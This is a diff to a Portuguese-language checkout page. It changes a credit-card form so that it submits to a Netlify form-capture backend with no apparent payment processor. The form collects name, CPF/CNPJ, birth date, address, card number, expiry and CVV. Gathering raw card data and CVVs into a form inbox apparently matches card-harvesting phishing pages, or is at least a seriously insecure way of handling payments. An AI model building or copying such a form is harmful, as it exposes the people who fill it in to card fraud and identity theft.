@@ -99,22 +99,25 @@
     <div class="payment-option">
         <h3>Pagar com Cartão de Crédito</h3>
         <p>Preencha seus dados abaixo e enviaremos as informações para o seu pagamento.</p>
-        <form action="processa_pagamento.php" method="POST">
-            <input type="text" name="nome" placeholder="Seu Nome" required>
-            <input type="email" name="email" placeholder="Seu Email" required>
-            <input type="text" name="cpf_cnpj" placeholder="CPF ou CNPJ" required>
-            <input type="text" name="telefone" placeholder="Número de Telefone" required>
-            <input type="text" name="data_nascimento" placeholder="Data de Nascimento" required>
-            <input type="text" name="endereco" placeholder="Endereço (Rua, Número, Bairro)" required>
-            <input type="text" name="cidade" placeholder="Cidade" required>
-            <input type="text" name="estado" placeholder="Estado" required>
-            <input type="text" name="cep" placeholder="CEP" required>
-            <input type="text" name="numero_cartao" placeholder="Número do Cartão de Crédito" required>
-            <input type="text" name="data_vencimento" placeholder="Data de Vencimento (MM/AA)" required>
-            <input type="text" name="codigo_seguranca" placeholder="Código de Segurança (CVV)" required>
-        
-            <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
-        </form>
+      <form name="pagamento" method="POST" data-netlify="true">
+    <input type="hidden" name="form-name" value="pagamento">
+    
+    <input type="text" name="nome" placeholder="Seu Nome" required>
+    <input type="email" name="email" placeholder="Seu Email" required>
+    <input type="text" name="cpf_cnpj" placeholder="CPF ou CNPJ" required>
+    <input type="text" name="telefone" placeholder="Número de Telefone" required>
+    <input type="text" name="data_nascimento" placeholder="Data de Nascimento" required>
+    <input type="text" name="endereco" placeholder="Endereço (Rua, Número, Bairro)" required>
+    <input type="text" name="cidade" placeholder="Cidade" required>
+    <input type="text" name="estado" placeholder="Estado" required>
+    <input type="text" name="cep" placeholder="CEP" required>
+    <input type="text" name="numero_cartao" placeholder="Número do Cartão de Crédito" required>
+    <input type="text" name="data_vencimento" placeholder="Data de Vencimento (MM/AA)" required>
+    <input type="text" name="codigo_seguranca" placeholder="Código de Segurança (CVV)" required>
+
+    <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
+</form>
+
         
     </div>
 </div>
